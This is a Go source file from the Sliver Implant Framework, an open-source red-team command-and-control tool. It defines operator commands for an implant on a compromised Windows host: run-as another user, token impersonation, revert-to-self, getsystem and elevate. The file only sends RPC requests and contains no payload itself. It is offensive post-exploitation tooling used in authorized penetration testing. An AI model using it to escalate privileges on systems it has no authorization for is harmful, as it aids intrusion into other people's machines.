package command

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"time"

	"github.com/bishopfox/sliver/client/spin"
	clientpb "github.com/bishopfox/sliver/protobuf/client"
	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

func runAs(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}
	username := ctx.Flags.String("username")
	process := ctx.Flags.String("process")
	arguments := ctx.Flags.String("args")

	if username == "" {
		fmt.Printf(Warn + "please specify a username\n")
		return
	}

	if process == "" {
		fmt.Printf(Warn + "please specify a process path\n")
	}

	runAs, err := runProcessAsUser(username, process, arguments, rpc)
	if err != nil {
		fmt.Printf(err.Error())
		return
	}
	if runAs.Err != "" {
		fmt.Printf(Warn+"Error: %s\n", runAs.Err)
		return
	}
	fmt.Printf(Info+"Sucessfully ran %s %s on %s\n", process, arguments, ActiveSliver.Sliver.Name)
}

func impersonate(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}
	if len(ctx.Args) != 1 {
		fmt.Printf(Warn + "You must provide a username. See `help impersonate`\n")
		return
	}
	username := ctx.Args[0]

	data, _ := proto.Marshal(&sliverpb.ImpersonateReq{
		Username: username,
		SliverID: ActiveSliver.Sliver.ID,
	})

	resp := <-rpc(&sliverpb.Envelope{
		Type: sliverpb.MsgImpersonate,
		Data: data,
	}, defaultTimeout)

	if resp.Err != "" {
		fmt.Printf(Warn+"Error: %s", resp.Err)
		return
	}
	impResp := &sliverpb.Impersonate{}
	err := proto.Unmarshal(resp.Data, impResp)
	if err != nil {
		fmt.Printf(Warn+"Unmarshaling envelope error: %v\n", err)
	}
	if impResp.Err != "" {
		fmt.Printf(Warn+"Error: %s\n", impResp.Err)
		return
	}
	fmt.Printf(Info+"Successfully impersonated %s\n", username)
}

func revToSelf(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}
	data, err := proto.Marshal(&sliverpb.RevToSelfReq{
		SliverID: ActiveSliver.Sliver.ID,
	})
	if err != nil {
		fmt.Printf(Warn+"Error marshaling RevToSelfReq: %v\n", err)
		return
	}

	resp := <-rpc(&sliverpb.Envelope{
		Type: sliverpb.MsgRevToSelf,
		Data: data,
	}, defaultTimeout)

	if resp.Err != "" {
		fmt.Printf(Warn+"Error from RPC server: %s", resp.Err)
		return
	}
	rtsResp := &sliverpb.RevToSelf{}
	err = proto.Unmarshal(resp.Data, rtsResp)
	if err != nil {
		fmt.Printf(Warn+"Unmarshaling envelope error: %v\n", err)
	}
	if rtsResp.Err != "" {
		fmt.Printf(Warn+"Error: %s", resp.Err)
		return
	}
	fmt.Printf(Info + "Back to self...")
}

func getsystem(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}
	process := ctx.Flags.String("process")
	config := getActiveSliverConfig()
	ctrl := make(chan bool)
	go spin.Until("Attempting to create a new sliver session as 'NT AUTHORITY\\SYSTEM'...", ctrl)
	data, _ := proto.Marshal(&clientpb.GetSystemReq{
		SliverID:       ActiveSliver.Sliver.ID,
		Config:         config,
		HostingProcess: process,
	})
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgGetSystemReq,
		Data: data,
	}, 45*time.Minute)
	ctrl <- true
	<-ctrl
	if resp.Err != "" {
		fmt.Printf(Warn+"Error: %s", resp.Err)
		return
	}
	gsResp := &sliverpb.GetSystem{}
	err := proto.Unmarshal(resp.Data, gsResp)
	if err != nil {
		fmt.Printf(Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}
	if gsResp.Output != "" {
		fmt.Printf("\n"+Warn+"Error: %s\n", gsResp.Output)
		return
	}
	fmt.Printf("\n" + Info + "A new SYSTEM session should pop soon...\n")
}

func elevate(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}
	ctrl := make(chan bool)
	go spin.Until("Starting a new sliver session...", ctrl)
	data, _ := proto.Marshal(&sliverpb.ElevateReq{SliverID: ActiveSliver.Sliver.ID})
	resp := <-rpc(&sliverpb.Envelope{
		Type: sliverpb.MsgElevate,
		Data: data,
	}, defaultTimeout)
	ctrl <- true
	<-ctrl
	if resp.Err != "" {
		fmt.Printf(Warn+"Error: %s", resp.Err)
		return
	}
	elevate := &sliverpb.Elevate{}
	err := proto.Unmarshal(resp.Data, elevate)
	if err != nil {
		fmt.Printf(Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}
	if !elevate.Success {
		fmt.Printf(Warn+"Elevation failed: %s\n", elevate.Err)
		return
	}
	fmt.Printf(Info + "Elevation successful, a new sliver session should pop soon.")
}

// Utility functions
func runProcessAsUser(username, process, arguments string, rpc RPCServer) (runAs *sliverpb.RunAs, err error) {
	data, _ := proto.Marshal(&sliverpb.RunAsReq{
		Username: username,
		Process:  process,
		Args:     arguments,
		SliverID: ActiveSliver.Sliver.ID,
	})

	resp := <-rpc(&sliverpb.Envelope{
		Type: sliverpb.MsgRunAs,
		Data: data,
	}, defaultTimeout)
	if resp.Err != "" {
		err = fmt.Errorf(Warn+"Error: %s", resp.Err)
		return
	}
	runAs = &sliverpb.RunAs{}
	err = proto.Unmarshal(resp.Data, runAs)
	if err != nil {
		err = fmt.Errorf(Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}
	return
}
